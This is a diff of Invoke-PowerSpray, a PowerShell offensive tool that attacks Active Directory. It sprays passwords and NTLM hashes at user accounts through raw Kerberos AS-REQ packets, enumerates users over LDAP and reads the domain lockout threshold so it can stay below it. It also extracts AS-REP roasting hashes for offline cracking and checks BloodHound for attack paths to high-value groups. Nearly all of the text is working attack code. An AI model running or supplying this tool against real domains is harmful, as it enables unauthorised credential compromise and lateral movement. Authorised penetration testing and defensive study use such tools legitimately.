@@ -1,4 +1,4 @@
-function Invoke-PowerSpray {
+Function Invoke-PowerSpray {
 <#
 .SYNOPSIS
     Guess Active Directory credentials via Kerberos preauthentication.
@@ -28,28 +28,23 @@ function Invoke-PowerSpray {
     Specifies a dump file containing NTLM password hashes in the format <domain>\<username>:<uid>:<LM-hash>:<NT-hash>:<comment>:<homedir>: (e.g secretsdump's output).
 
 .PARAMETER EncType
-    Specifies the encryption type for Kerberos, defaults to 18 (AES256-CTS-HMAC-SHA1-96). When NTLM hash is used for authentication, it is downgraded to 23 (ARCFOUR-HMAC-MD5).
-
-.PARAMETER Domain
-    Specifies the domain to build the AS-REQ for.
+    Specifies the encryption type for Kerberos, defaults to AES256 (AES256-CTS-HMAC-SHA1-96). When NTLM hash is used for authentication, it is downgraded to RC4 (ARCFOUR-HMAC-MD5).
 
 .PARAMETER Server
-    Specifies a specific domain controller to send the AS-REQ to.
+    Specifies the domain controller to send the AS-REQ to.
 
 .PARAMETER Ldap
     Enables domain account enumeration via LDAP.
 
-.PARAMETER LdapUser
-    Specifies the username to use for LDAP bind.
+.PARAMETER LdapCredential
+    Specifies credentials to use for LDAP bind.
 
-.PARAMETER LdapPass
-    Specifies the password to use for LDAP bind.
-
-.PARAMETER NoOldPwd
-    Disables old password discovery to reduce the number of LDAP queries.
+.PARAMETER CheckOldPwd
+    Enables old password discovery by checking the badPwdCount attribute after each unsuccessful authentication.
 
 .PARAMETER LockoutThreshold
     Specifies the maximum value of the badPwdCount attribute of the target users enumerated via LDAP.
+    By default, value is based on domain's Default Password Policy.
 
 .PARAMETER Delay
     Specifies the delay (in seconds) between authentication attempts, defaults to 0.
@@ -63,7 +58,7 @@ function Invoke-PowerSpray {
 .PARAMETER BloodHound
     Enables Bloodhound integration to identify path to high value targets.
 
-.PARAMETER Credential
+.PARAMETER Neo4jCredential
     Specifies credentials for BloodHound's Neo4j database.
 
 .PARAMETER Neo4jHost
@@ -73,19 +68,19 @@ function Invoke-PowerSpray {
     Specifies Neo4j server port.
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -UserFile .\users.lst -Server 192.168.1.10
+    PS C:\> Invoke-PowerSpray -Server 192.168.1.10 -UserFile .\users.lst
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -EncType 23 -Ldap -LdapUser simpleuser -LdapPass 'P@ssw0rd'
+    PS C:\> Invoke-PowerSpray -Ldap -BloodHound
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -Password 'Welcome2020' -Ldap -BloodHound
+    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
+    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -LdapCredential testuser@ADATUM.CORP -Password 'Welcome2020' -EncType RC4
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Domain ADATUM.CORP -DumpFile .\contoso.ntds -Threads 5
+    PS C:\> Invoke-PowerSpray -Server ADATUM.CORP -DumpFile .\CONTOSO.ntds -Threads 5
 #>
 
     [CmdletBinding()]
@@ -104,26 +99,21 @@ function Invoke-PowerSpray {
 
         [ValidateNotNullOrEmpty()]
         [String]
-        $Domain,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Server,
+        $Server = $Env:USERDNSDOMAIN,
 
         [Switch]
         $Ldap,
 
-        [String]
-        $LdapUser,
-
-        [String]
-        $LdapPass,
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $LdapCredential = [Management.Automation.PSCredential]::Empty,
 
         [Switch]
-        $NoOldPwd,
+        $CheckOldPwd,
 
         [Int]
-        $LockoutThreshold = 2,
+        $LockoutThreshold,
 
         [String]
         $Password,
@@ -132,9 +122,9 @@ function Invoke-PowerSpray {
         [String]
         $Hash,
 
-        [ValidateSet(1, 3, 17, 18, 23, 24)]
-        [Int]
-        $EncType = 18,
+        [ValidateSet('RC4', 'AES256', 'AES128', 'DES')]
+        [string]
+        $EncType = 'AES256',
 
         [UInt32]
         $Delay = 0,
@@ -150,9 +140,9 @@ function Invoke-PowerSpray {
         $BloodHound,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = (New-Object System.Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Neo4jCredential = (New-Object Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -163,38 +153,44 @@ function Invoke-PowerSpray {
         $Neo4jPort = 7474
     )
 
-    if (-not ($Domain -or $Server)) {
-        # Specify current domain by default
-        try {
-            $Domain = $Env:USERDNSDOMAIN
-        }
-        catch {
-            Write-Error "Running on a non-domain joined machine, please specify Domain or Server parameter" -ErrorAction Stop
-        }
-    }
-
-    if ($Server) {
-        # Check if the Server parameter is an IP address
-        try {
-            [System.Net.IPAddress]::Parse($Server) | Out-Null
-        }
-        catch {
-            $Server = (Resolve-DnsName -Name $Server -Verbose:$false).IPAddress | Select-Object -First 1
-        }
-    }
-    else {
-        # Specify domain controller with PDC role by default, to avoid replication issues with badPwdCount
-        $Server = (Resolve-DnsName -Server $Domain -Name "_ldap._tcp.pdc._msdcs.$Domain" -Type SRV -Verbose:$false).IPAddress | Select-Object -First 1
-    }
-
-    if ($Domain) {
-        $rootDN = "DC=$Domain" -replace '\.',',DC='
-    }
-    else {
+    try {
         $searchString = "LDAP://$Server/RootDSE"
-        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
-        $rootDN = $domainObject.rootDomainNamingContext[0]
-        $Domain = $rootDN -replace 'DC=' -replace ',','.'
+        $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
+        $defaultNC = $rootDSE.defaultNamingContext[0]
+        $adsPath = "LDAP://$Server/$defaultNC"
+        $domain = $defaultNC -replace 'DC=' -replace ',','.'
+    }
+    catch {
+        Write-Error "Domain controller unreachable" -ErrorAction Stop
+    }
+
+    # Check if the Server parameter is an IP address
+    try {
+        [Net.IPAddress]::Parse($Server) | Out-Null
+    }
+    catch {
+        $Server = (Resolve-DnsName -Name $Server -Verbose:$false).IPAddress | Select-Object -First 1
+    }
+
+    if ($CheckOldPwd) {
+        $Ldap = $true
+    }
+    if ($Ldap) {
+        if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash'))) {
+            # Check if the Server has PDC role
+            $pdcServers = (Resolve-DnsName -Server $domain -Name "_ldap._tcp.pdc._msdcs.$domain" -Type SRV -Verbose:$false).IPAddress
+            if (-not ($pdcServers -contains $Server)) {
+                Write-Warning "The domain controller specified doesn't not seem to have PDC role. Bad result may occur due to replication issues with badPwdCount attribute"
+            }
+        }
+
+        if (-not $LockoutThreshold) {
+            # Get lockout threshold defined in Default Password Policy
+            $LockoutThreshold = (Get-LdapObject -ADSpath $adsPath -Credential $LdapCredential -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
+            Write-Warning "LockoutThreshold value defined in Default Password Policy is $LockoutThreshold"
+        }
+
+        $properties = @('sAMAccountName', 'badPwdCount', 'userAccountControl', 'msds-supportedencryptiontypes')
     }
 
     $pass = $null
@@ -204,6 +200,7 @@ function Invoke-PowerSpray {
 
     $nthash = $null
     if ($PSBoundParameters.ContainsKey('Hash')) {
+        $EncType = 'RC4'
         if($Hash -like "*:*") {
             $nthash = $Hash.SubString(($Hash.IndexOf(":") + 1),32)
         }
@@ -212,58 +209,62 @@ function Invoke-PowerSpray {
         }
     }
 
-    $ADSpath = "LDAP://$Server/$rootDN"
     $badPwdCount = -1
-    $credentials = New-Object System.Collections.ArrayList
+    $user = $null
+    $credentials = New-Object Collections.ArrayList
 
     if ($Username) {
         if ($Ldap) {
             $filter = "(samAccountName=$Username)"
-            $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
-            if ($badPwdCount -eq $null) {
-                Write-Error "$($username)@$($Domain) does not exist" -ErrorAction Stop
+            if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
+                $badPwdCount = $user.badPwdCount
+            }
+            else {
+                Write-Error "$($username)@$($domain) does not exist" -ErrorAction Stop
             }
         }
-        if ($badPwdCount -ne $null -or -not $Ldap) {
-            $cred = @{Username = $Username; Password = $pass; Hash = $nthash; BadPwdCount = $badPwdCount}
-            $credentials.add($cred) | Out-Null
-        }
+        $cred = [pscustomobject] @{Username = $Username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+        $credentials.add($cred) | Out-Null
     }
     elseif ($UserFile) {
         $UserFilePath = Resolve-Path -Path $UserFile
-        ForEach ($username in Get-Content $UserFilePath) {
+        foreach ($username in Get-Content $UserFilePath) {
             if ($Ldap) {
                 $filter = "(samAccountName=$username)"
-                $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
-                if ($badPwdCount -eq $null) {
-                    Write-Verbose "$($username)@$($Domain) does not exist"
+                if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
+                    $badPwdCount = $user.badPwdCount
+                }
+                else {
+                    Write-Verbose "$($username)@$($domain) does not exist"
                 }
             }
-            if ($badPwdCount -ne $null -or -not $Ldap) {
-                $cred = @{Username = $username; Password = $pass; Hash = $nthash; BadPwdCount = $badPwdCount}
+            if ($user -or -not $Ldap) {
+                $cred = [pscustomobject] @{Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
     }
     elseif ($DumpFile) {
-        $DumpFilePath = Resolve-Path -Path $DumpFile
-        ForEach ($line in Get-Content $DumpFilePath) {
+        $dumpFilePath = Resolve-Path -Path $DumpFile
+        foreach ($line in Get-Content $dumpFilePath) {
             $dump = $line.Split(':')
-            $user = $dump[0]
-            if ($user) {
-                if ($user.Contains('\')) {
-                    $username = $user.split('\')[1]
+            $username = $dump[0]
+            if ($username) {
+                if ($username.Contains('\')) {
+                    $username = $username.split('\')[1]
                 }
                 if ($Ldap) {
                     $filter = "(samAccountName=$username)"
-                    $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
-                    if ($badPwdCount -eq $null) {
-                        Write-Verbose "$($username)@$($Domain) does not exist"
+                    if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
+                        $badPwdCount = $user.badPwdCount
+                    }
+                    else {
+                        Write-Verbose "$($username)@$($domain) does not exist"
                     }
                 }
-                if ($badPwdCount -ne $null -or -not $Ldap) {
+                if ($user -or -not $Ldap) {
                     $nthash = $dump[3]
-                    $cred = @{Username = $username; Password = $pass; Hash = $nthash; BadPwdCount = $badPwdCount}
+                    $cred = [pscustomobject] @{Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
                 }
             }
@@ -275,18 +276,21 @@ function Invoke-PowerSpray {
         foreach($userAccountControl in $disabledUserAccountControl) {
             $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
         }
-        if (-not ($pass -or $nthash)) {
+        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash'))) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
-            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
+            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
         }
         else {
             # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
-            $filter = "(&(samAccountType=805306368)(!badPwdCount>=$LockoutThreshold)$filter)"
-            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties sAMAccountName,badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass
+            if ($LockoutThreshold -gt 0) {
+                $filter = "(&(!(badPwdCount>=$LockoutThreshold))$filter)"
+            }
+            $filter = "(&(samAccountType=805306368)$filter)"
+            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
         }
-        ForEach ($user in $users) {
-            $cred = @{Username = $user.samAccountName; Password = $pass; Hash = $nthash; BadPwdCount = $user.badPwdCount}
+        foreach ($user in $users) {
+            $cred = [pscustomobject] @{Username = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
             $credentials.add($cred) | Out-Null
         }
     }
@@ -296,18 +300,17 @@ function Invoke-PowerSpray {
 
     $params = @{
         EncType = $EncType
-        Domain = $Domain
+        Domain = $domain
         Server = $Server
-        ADSpath = $ADSpath
+        ADSpath = $adsPath
         Delay = $Delay
         Jitter = $Jitter
         Ldap = $Ldap
-        LdapUser = $LdapUser
-        LdapPass = $LdapPass
-        NoOldPwd = $NoOldPwd
+        LdapCredential = $LdapCredential
+        CheckOldPwd = $CheckOldPwd
         LockoutThreshold = $LockoutThreshold
         BloodHound = $BloodHound
-        Credential = $Credential
+        Neo4jCredential = $Neo4jCredential
         Neo4jHost = $Neo4jHost
         Neo4jPort = $Neo4jPort
         Verbose = $VerbosePreference
@@ -320,10 +323,10 @@ function Invoke-PowerSpray {
     }
 }
 
-function Local:New-KerberosSpray {
+Function Local:New-KerberosSpray {
     [CmdletBinding()]
     Param (
-        [System.Collections.ArrayList]
+        [Collections.ArrayList]
         $Collection,
 
         [Parameter(Mandatory = $True)]
@@ -334,9 +337,9 @@ function Local:New-KerberosSpray {
         [String]
         $Server,
 
-        [ValidateSet(1, 3, 17, 18, 23, 24)]
-        [Int]
-        $EncType,
+        [ValidateSet('RC4', 'AES256', 'AES128', 'DES')]
+        [string]
+        $EncType = 'AES256',
 
         [UInt32]
         $Delay,
@@ -347,14 +350,13 @@ function Local:New-KerberosSpray {
         [Switch]
         $Ldap,
 
-        [String]
-        $LdapUser,
-
-        [String]
-        $LdapPass,
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $LdapCredential,
 
         [Switch]
-        $NoOldPwd,
+        $CheckOldPwd,
 
         [Int]
         $LockoutThreshold,
@@ -365,8 +367,8 @@ function Local:New-KerberosSpray {
         [Switch]
         $BloodHound,
 
-        [System.Management.Automation.PSCredential]
-        $Credential,
+        [Management.Automation.PSCredential]
+        $Neo4jCredential,
 
         [String]
         $Neo4jHost,
@@ -375,22 +377,54 @@ function Local:New-KerberosSpray {
         $Neo4jPort
     )
 
-    ForEach ($cred in $Collection) {
-        if ($cred.Password -or $cred.Hash -and $cred.badPwdCount -ge $LockoutThreshold) {
-            Write-Host "[!] Skipping $($cred.Username)@$Domain because its 'badPwdCount' is $($cred.badPwdCount) (> $LockoutThreshold)"
+    switch ($EncType) {
+        'DES' {
+            # ETYPE 3 = DES-CBC-MD5
+            $eType = 3
+        }
+        'AES128' {
+            # ETYPE 17 = AES128-CTS-HMAC-SHA1-96
+            $eType = 17
+        }
+        'AES256' {
+            # ETYPE 18 = AES256-CTS-HMAC-SHA1-96
+            $eType = 18
+        }
+        'RC4' {
+            # ETYPE 23 = ARCFOUR-HMAC-MD5
+            $eType = 23
+        }
+    }
+
+    foreach ($cred in $Collection) {
+        if ($cred.badPwdCount -eq -1) {
+            $cred.PSObject.Properties.Remove('BadPwdCount')
+        }
+
+        if ($cred.Password -or $cred.NTHash -and $LockoutThreshold -gt 0 -and $cred.badPwdCount -ge $LockoutThreshold) {
+            $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Skipped'
+            $cred.PSObject.Properties.Remove('Password')
+            $cred.PSObject.Properties.Remove('NTHash')
+            Write-Output $cred
             continue
         }
 
         if ($cred.Password -ne $null) {
             $salt = "$($Domain.ToUpper())$($cred.Username)"
-            $keyBytes = KerberosPasswordHash -eType $EncType -Password $cred.Password -Salt $salt
+            $keyBytes = KerberosPasswordHash -eType $eType -Password $cred.Password -Salt $salt
+            $cred.PSObject.Properties.Remove('NTHash')
         }
-        elseif ($cred.Hash) {
+        elseif ($cred.NTHash) {
             # ETYPE 23 = ARCFOUR-HMAC-MD5
-            $EncType = 23
-            $keyBytes = [byte[]] ($cred.Hash -replace '..', '0x$&,' -split ',' -ne '')
+            $eType = 23
+            $keyBytes = [byte[]] ($cred.NTHash -replace '..', '0x$&,' -split ',' -ne '')
+            $cred.PSObject.Properties.Remove('Password')
         }
-        $asn_AS_REP = New-KerbPreauth -EncType $EncType -UserName $cred.Username -Key $keyBytes -Domain $Domain -Server $Server
+        else {
+            $cred.PSObject.Properties.Remove('Password')
+            $cred.PSObject.Properties.Remove('NTHash')
+        }
+        $asn_AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $Domain -Server $Server
         $tag = $asn_AS_REP.TagValue
 
         # ERR_PREAUTH_REQUIRED
@@ -402,83 +436,91 @@ function Local:New-KerberosSpray {
                 # KDC_ERR_C_PRINCIPAL_UNKNOWN
                 6 {
                     Write-Verbose "$($cred.Username)@$($Domain) does not exist" 
+                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                 }
                 # KDC_ERR_ETYPE_NOSUPP
                 14 {
-                    Write-Warning "$($cred.Username)@$($Domain) preauthentication failed because KDC has no support for encryption type"
+                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'ETypeNotSupported'
+                    if ($cred.Password) {
+                        $cred.Password = $null
+                    }
+                    elseif ($cred.NTHash) {
+                        $cred.NTHash = $null
+                    }
                 }
                 # KDC_ERR_CLIENT_REVOKED
                 18 {
-                    Write-Host "[-] $($cred.Username)@$($Domain) account disabled or locked out"
+                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Disabled'
                 }
                 # KDC_ERR_KEY_EXPIRED
                 23 {
+                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Expired'
                     if ($BloodHound) {
                         $pathNb = 0
-                        $bhPath = $null
                         $query = "
                         MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                         RETURN COUNT(p) AS pathNb
                         "
                         try {
-                            $result = New-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
+                            $result = New-BloodHoundQuery -Query $query -Credential $Neo4jCredential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                             $pathNb = $result.data[0] | Where-Object {$_}
                             if ($pathNb -gt 0) {
-                                $bhPath = '[PATH TO HIGH VALUE TARGETS]'
+                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $true
+                            }
+                            else {
+                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $false
                             }
                         }
                         catch {
                             Write-Warning $Error[0].ErrorDetails.Message
                         }
                     }
-                    Write-Host "[+] $($cred.Username)@$($Domain) failed to authenticate [expired password] $bhPath"
                 }
                 # KDC_ERR_PREAUTH_FAILED
                 24 {
-                    $output = "$($cred.Username)@$($Domain) failed to authenticate"
                     $newBadPwdCount = $null
-                    if ($Ldap -and -not $NoOldPwd -and ($($cred.Username) -ne $LdapUser)) {
+                    if ($CheckOldPwd -and ($($cred.Username) -ne $LdapCredential.UserName)) {
                         $filter = "(samAccountName=$($cred.Username))"
-                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -Credential $LdapCredential).badPwdCount
                     }
                     if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
-                            Write-Host "[?] $output [old password]"
+                        $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Renewed'
+                        
                     }
                     else {
-                        Write-Verbose "$output"
+                        Write-Verbose "$($cred.Username)@$($Domain) failed to authenticate"
+                        $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                     }
                 }
                 # KDC_ERR_PREAUTH_REQUIRED
                 25 {
-                    $output = "$($cred.Username)@$($Domain) exists"
-                    if ($Ldap) {
-                        Write-Verbose $output
-                    }
-                    else {
-                        Write-Host "[+] $output"
+                    if (-not $Ldap) {
+                        $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
                     }
                 }
                 # KRB_AP_ERR_SKEW
                 37 {
+                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
                     if ($BloodHound) {
                         $pathNb = 0
-                        $bhPath = $null
                         $query = "
                         MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                         RETURN COUNT(p) AS pathNb
                         "
                         try {
-                            $result = New-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
+                            $result = New-BloodHoundQuery -Query $query -Credential $Neo4jCredential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                             $pathNb = $result.data[0] | Where-Object {$_}
                             if ($pathNb -gt 0) {
-                                $bhPath = '[PATH TO HIGH VALUE TARGETS]'
+                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $true
+                            }
+                            else {
+                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $false
                             }
                         }
                         catch {
                             Write-Warning $Error[0].ErrorDetails.Message
                         }
                     }
-                    Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated! $bhPath"
                 }
                 # KDC_ERR_WRONG_REALM
                 68 {
@@ -492,8 +534,9 @@ function Local:New-KerberosSpray {
         }
         # AS-REP
         elseif ($tag -eq 11) {
-            if (-not ($cred.Password -or $cred.Hash)) {
-                Write-Host "[+] $($cred.Username)@$($Domain) does not require Kerberos preauthentication!"
+            if ($cred.Password -eq $null -and $cred.NTHash -eq $null) {
+                $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'PreauthNotRequired'
+                $cred.PSObject.Properties.Remove('BadPwdCount')
                 $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
                 $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
                 $cipher = $temp.Sub[0].GetOctetString()
@@ -501,41 +544,48 @@ function Local:New-KerberosSpray {
                 $asrepHash = $repHash.Insert(32, '$')
                 $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 0}
                 $eType = $temp.Sub[0].GetInteger()
-                Write-Output "`$krb5asrep`$$($eType)`$$($cred.Username)@$($Domain):$($asrepHash)"
+                $hash = "`$krb5asrep`$$($eType)`$$($cred.Username)@$($Domain):$($asrepHash)"
+                $cred | Add-Member -MemberType NoteProperty -Name 'KRB5ASRep' -Value $hash
             }
             else {
+                $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
                 if ($BloodHound) {
                     $pathNb = 0
-                    $bhPath = $null
                     $query = "
                     MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
                     "
                     try {
-                        $result = New-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
+                        $result = New-BloodHoundQuery -Query $query -Credential $Neo4jCredential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                         $pathNb = $result.data[0] | Where-Object {$_}
                         if ($pathNb -gt 0) {
-                            $bhPath = '[PATH TO HIGH VALUE TARGETS]'
-                        }
+                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $true
+                            }
+                            else {
+                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $false
+                            }
                     }
                     catch {
                         Write-Warning $Error[0].ErrorDetails.Message
                     }
                 }
-                Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated! $bhPath"
             }
         }
         else {
-            Write-Warning "Unknown tag number for '$($cred.Username)@$($Domain): $tag'"
+            Write-Warning "Unknown tag number for '$($cred.Username)@$($domain): $tag'"
         }
 
-        $randNb = New-Object System.Random
+        if ($cred.Status -ne 'Invalid') {
+            Write-Output $cred
+        }
+
+        $randNb = New-Object Random
         $waitingTime = $randNb.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         Start-Sleep -Seconds $waitingTime
     }
 }
 
-function Local:New-KerbPreauth {
+Function Local:New-KerbPreauth {
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $True)]
@@ -565,12 +615,12 @@ function Local:New-KerbPreauth {
         $Server
     )
 
-    $Address = [System.Net.IPAddress]::Parse($Server)
-    $EndPoint = New-Object System.Net.IPEndPoint $Address, 88
-    $Socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::TCP)
+    $Address = [Net.IPAddress]::Parse($Server)
+    $EndPoint = New-Object Net.IPEndPoint $Address, 88
+    $Socket = New-Object Net.Sockets.Socket ([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::TCP)
     $Socket.TTL = 128
     $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType -Key $Key
-    $LengthBytes = [System.BitConverter]::GetBytes($ASREQ.Length)
+    $LengthBytes = [BitConverter]::GetBytes($ASREQ.Length)
     [Array]::Reverse($LengthBytes)
     $totalRequestBytes  = $LengthBytes + $ASREQ
 
@@ -578,7 +628,7 @@ function Local:New-KerbPreauth {
         $Socket.Connect($EndPoint)
         $BytesSent = $Socket.Send($totalRequestBytes)
 
-        $ResponseBuffer = New-Object System.Byte[] 65536
+        $ResponseBuffer = New-Object Byte[] 65536
         $BytesReceived = $Socket.Receive($ResponseBuffer)
     }
     catch {
@@ -588,7 +638,7 @@ function Local:New-KerbPreauth {
     return [Asn1.AsnElt]::Decode($ResponseData, $false)
 }
 
-function Local:New-ASReq {
+Function Local:New-ASReq {
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $True)]
@@ -717,7 +767,7 @@ function Local:New-ASReq {
     $sname = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 3, $snameElt)
 
     # till            [5] KerberosTime
-    $tillDate = [DateTime]::ParseExact("20370913024805Z", "yyyyMMddHHmmssZ", [System.Globalization.CultureInfo]::InvariantCulture)
+    $tillDate = [DateTime]::ParseExact("20370913024805Z", "yyyyMMddHHmmssZ", [Globalization.CultureInfo]::InvariantCulture)
     $tillAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::GeneralizedTime, $tillDate.ToString("yyyyMMddHHmmssZ"))
     $tillSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($tillAsn))
     $till = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 5, $tillSeq)
@@ -749,7 +799,7 @@ function Local:New-ASReq {
     return $appSeq.Encode()
 }
 
-function Local:KerberosPasswordHash {
+Function Local:KerberosPasswordHash {
     [CmdletBinding()]
     param ( 
         [parameter(Mandatory=$True)]
@@ -773,20 +823,20 @@ function Local:KerberosPasswordHash {
     $KERB_ECRYPT = [Win32+KERB_ECRYPT]
     $UNICODE_STRING = [Win32+UNICODE_STRING]
 
-    $kerbEcryptSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
-    $pCSystemPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
+    $kerbEcryptSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
+    $pCSystemPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
     $status = [Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
     if ($status -ne 0) {
         throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
     }
-    $pCSystem = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)
+    $pCSystem = [Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)
 
     $passwordUnicode = New-Object $UNICODE_STRING $Password
     $saltUnicode = New-Object $UNICODE_STRING $Salt
     $output = New-Object Byte[] $pCSystem.KeySize
 
     $KerbEcryptHashPasswordDelegate = Get-DelegateType @($UNICODE_STRING, $UNICODE_STRING, [int], [byte[]]) ([int])
-    $KerbEcryptHashPassword = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.HashPassword, $KerbEcryptHashPasswordDelegate)
